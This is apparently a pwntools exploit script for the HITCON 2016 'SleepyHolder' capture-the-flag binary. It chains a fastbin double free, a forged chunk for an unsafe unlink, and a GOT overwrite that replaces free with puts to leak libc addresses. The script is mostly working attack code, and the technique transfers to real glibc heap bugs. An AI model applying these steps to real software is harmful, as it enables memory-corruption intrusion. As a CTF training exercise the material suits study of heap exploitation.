from pwn import *
filename="./sleepyHolder_hitcon_2016"
libc_name="./libc-2.23.so"
io = process(filename)
context.log_level='debug'
elf=ELF(filename)
libc=ELF(libc_name)
context.terminal=['tmux','split','-hp','60']


def sendchoice(choice):
    io.recvuntil('3. Renew secret\n')
    io.sendline(str(choice))

def keep(choice,secret,has=True):
    sendchoice(1)
    if(has):
        # no big chunk malloced
        io.recvuntil('forever\n')
        io.sendline(str(choice))
    else:
        io.recvuntil('secret\n')
        io.sendline(str(choice))
    io.send(secret)

def wipe(id):
    sendchoice(2)
    io.recvuntil('2. Big secret\n')
    io.sendline(str(id))

def renew(id,con):
    sendchoice(3)
    io.recvuntil('2. Big secret\n')
    io.sendline(str(id))
    io.recvuntil('Tell me your secret: \n')
    io.send(con)

def debug():
    cmd = ""
    cmd +="b *0x400B1D"
    gdb.attach(io,cmd) # b wipe
    wipe(0)

# create prot heap
small_ptr = 0x6020D0

keep(1,'aaa')
keep(2,'aaa')
wipe(1)
keep(3,'bbb') # call consilidate, fastbin chunk into smallbin
# debug() # ptr 1 in smallbin
wipe(1) # double free
# debug() # this time without error!! freed
# now we can write smalbin, trigger unlink in free(2)
payload1 = p64(0) + p64(0x21) + p64(small_ptr-0x18) + p64(small_ptr-0x10) + p64(0x20)
keep(1,payload1,False)
# gdb.attach(io,"b *0x400B1D")
wipe(2) # trigger unlink, now small+0x18 = &small

# change atoi's got with puts
payload2 = p64(elf.got['puts']) + p64(elf.got['free']) + p64(0) + p64(0x6020b8) + p64(1)
renew(1,payload2)
renew(2,p64(elf.plt['puts'])) # change free with puts
# debug() # check atoi changed with puts
gdb.attach(io,"b *0x400B8F")
wipe(1)





io.interactive()
